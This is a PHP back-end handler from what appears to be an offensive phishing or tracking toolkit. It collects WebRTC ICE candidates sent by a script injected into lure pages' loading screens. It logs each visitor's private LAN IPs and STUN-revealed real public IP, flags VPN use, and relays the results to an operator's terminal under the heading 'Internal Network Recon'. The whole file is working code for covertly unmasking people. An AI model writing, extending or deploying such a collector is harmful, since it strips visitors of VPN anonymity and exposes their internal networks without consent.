<?php
/* ════════════════════════════════════════════════════════════════════
   webrtc_ip.php — WebRTC Internal IP & VPN Detection Handler
   ─────────────────────────────────────────────────────────────────
   Receives ICE candidate data posted by the WebRTC collector injected
   into core/template.php (runs on every template's loading screen).

   What it extracts
   ─────────────────
   • Private / LAN IPs   — "typ host" candidates:
       10.x.x.x  /  172.16–31.x.x  /  192.168.x.x  /  169.254.x.x
       + browser-generated mDNS privacy hostnames (uuid.local)
   • Real external IP    — "typ srflx" candidates:
       The IP the STUN server observed — bypasses VPN header spoofing.
   • VPN detection       — if srflx IP ≠ HTTP-header IP, a VPN is active.

   POST params
   ──────────────
     ips  — JSON object  { "<ip_or_hostname>": "<candidate_type>", … }

   Response  →  { "status": "success" | "error", "message": "…" }

   Data written
   ─────────────
     data/webrtc_ips.txt    — append-only human-readable log
     data/webrtc_ips.jsonl  — append-only structured JSON lines
     data/.flag_webrtc      — polled by netraX-2.0.sh checkfound() loop
   ════════════════════════════════════════════════════════════════════ */

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

/* ── Data directory ─────────────────────────────────────────────── */
$data_dir = dirname(__DIR__) . '/data';
if (!is_dir($data_dir)) {
    mkdir($data_dir, 0750, true);
}

/* ── Decode and validate input ──────────────────────────────────── */
$raw = isset($_POST['ips']) ? trim($_POST['ips']) : '';
if ($raw === '') {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'No data']);
    exit;
}

$decoded = json_decode($raw, true);
if (!is_array($decoded) || empty($decoded)) {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'error', 'message' => 'Invalid data']);
    exit;
}

/* ── Helper: is this IP private/reserved or a mDNS hostname? ───── */
function webrtc_isPrivateOrMDNS(string $ip): bool
{
    /* mDNS privacy hostname (Chrome hides real LAN IP behind uuid.local) */
    if (preg_match('/^[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\.local$/i', $ip)) {
        return true;
    }
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
        /* Private ranges: 10/8, 172.16/12, 192.168/16, 169.254/16 */
        return filter_var(
            $ip, FILTER_VALIDATE_IP,
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE
        ) === false;
    }
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)) {
        /* link-local fe80::/10  and  ULA fc00::/7 */
        return (bool) preg_match('/^(fe[89ab][0-9a-f]:|fc|fd)/i', $ip);
    }
    return false;
}

/* ── Recover HTTP-layer public IP for VPN comparison ────────────── */
$http_ip = '';
foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'] as $hdr) {
    if (!empty($_SERVER[$hdr])) {
        $cand = trim($_SERVER[$hdr]);
        if (filter_var($cand, FILTER_VALIDATE_IP)) {
            $http_ip = $cand;
            break;
        }
    }
}

/* ── Parse candidate map sent by the browser ────────────────────── */
$date      = date('Y-m-d H:i:s');
$host_ips  = [];   // private / LAN IPs  (typ host)
$srflx_ips = [];   // public IPs seen by STUN server (typ srflx)

$allowed_types = ['host', 'srflx', 'prflx', 'relay', 'unknown'];

foreach ($decoded as $raw_key => $raw_val) {
    $raw_ip   = substr((string) $raw_key, 0, 256);
    $raw_type = substr((string) $raw_val, 0,  32);

    $type = in_array($raw_type, $allowed_types, true) ? $raw_type : 'unknown';

    /* Accept only valid IPs or RFC-format mDNS hostnames — reject everything else */
    $is_real_ip = filter_var($raw_ip, FILTER_VALIDATE_IP) !== false;
    $is_mdns    = (bool) preg_match(
        '/^[0-9a-f]{8}(?:-[0-9a-f]{4}){3}-[0-9a-f]{12}\.local$/i',
        $raw_ip
    );

    if (!$is_real_ip && !$is_mdns) {
        continue;
    }

    if ($type === 'host' && webrtc_isPrivateOrMDNS($raw_ip)) {
        $host_ips[] = $raw_ip;
    } elseif ($type === 'srflx' && $is_real_ip) {
        $srflx_ips[] = $raw_ip;
    }
}

$host_ips  = array_values(array_unique($host_ips));
$srflx_ips = array_values(array_unique($srflx_ips));

/*
 * VPN detection — checked AFTER all candidates are deduplicated.
 *
 * Dual-stack devices (IPv4 + IPv6) produce two srflx IPs from the same
 * STUN round-trip.  The HTTP header carries whichever stack the tunnel
 * proxy forwarded (usually IPv6 on modern networks), so the IPv4 srflx
 * will never equal the IPv6 HTTP header — causing a false positive if we
 * check per-candidate inside the loop.
 *
 * Correct rule: VPN is active only when we have at least one srflx IP
 * AND *none* of those IPs match the HTTP header IP.  If even one srflx
 * matches, the connection is direct (the server can see the real IP).
 */
$vpn_flag = !empty($srflx_ips)
          && $http_ip !== ''
          && !in_array($http_ip, $srflx_ips, true);

if (empty($host_ips) && empty($srflx_ips)) {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok', 'message' => 'No private IPs extracted']);
    exit;
}

/* ── Build log block ─────────────────────────────────────────────── */
$divider = str_repeat('─', 52);

$lines = [
    '',
    $divider,
    '[WEBRTC IP]  Internal Network Recon',
    $divider,
];

if (!empty($host_ips)) {
    $lines[] = 'Private IP(s) : ' . implode(', ', $host_ips);
}
if (!empty($srflx_ips)) {
    $lines[] = 'Real Ext. IP  : ' . implode(', ', $srflx_ips);
}
$lines[] = 'HTTP Hdr IP   : ' . ($http_ip !== '' ? $http_ip : 'unknown');
$lines[] = 'VPN Detected  : ' . ($vpn_flag ? 'YES  —  none of the srflx IPs match the HTTP header IP' : 'No  (direct connection or dual-stack match)');
$lines[] = 'Time          : ' . $date;
$lines[] = $divider;
$lines[] = '';

$log_block = implode("\n", $lines);

/* ── 1. Print to terminal (stderr → visible in `php -S` console) ── */
file_put_contents('php://stderr', $log_block);
error_log(trim($log_block));

/* ── 2. Append human-readable log (append-only, locked) ─────────── */
$log_file = $data_dir . '/webrtc_ips.txt';
$fp = fopen($log_file, 'a');
if ($fp) {
    flock($fp, LOCK_EX);
    fwrite($fp, $log_block);
    flock($fp, LOCK_UN);
    fclose($fp);
    @chmod($log_file, 0640);
}

/* ── 3. Append structured JSON line record ───────────────────────── */
$json_record = json_encode([
    'timestamp'    => $date,
    'private_ips'  => $host_ips,
    'stun_ext_ip'  => $srflx_ips,
    'http_hdr_ip'  => $http_ip,
    'vpn_detected' => $vpn_flag,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE) . "\n";

$jsonl_file = $data_dir . '/webrtc_ips.jsonl';
$fp2 = fopen($jsonl_file, 'a');
if ($fp2) {
    flock($fp2, LOCK_EX);
    fwrite($fp2, $json_record);
    flock($fp2, LOCK_UN);
    fclose($fp2);
    @chmod($jsonl_file, 0640);
}

/* ── 4. Write .flag_webrtc — full block so shell prints same output ─ */
// The shell watcher (netraX-2.0.sh checkfound) reads this file and
// prints it to the operator's terminal, so we store the identical
// formatted block that was already printed via php://stderr.
file_put_contents($data_dir . '/.flag_webrtc', $log_block);

header('Content-Type: application/json');
echo json_encode(['status' => 'success']);
exit;
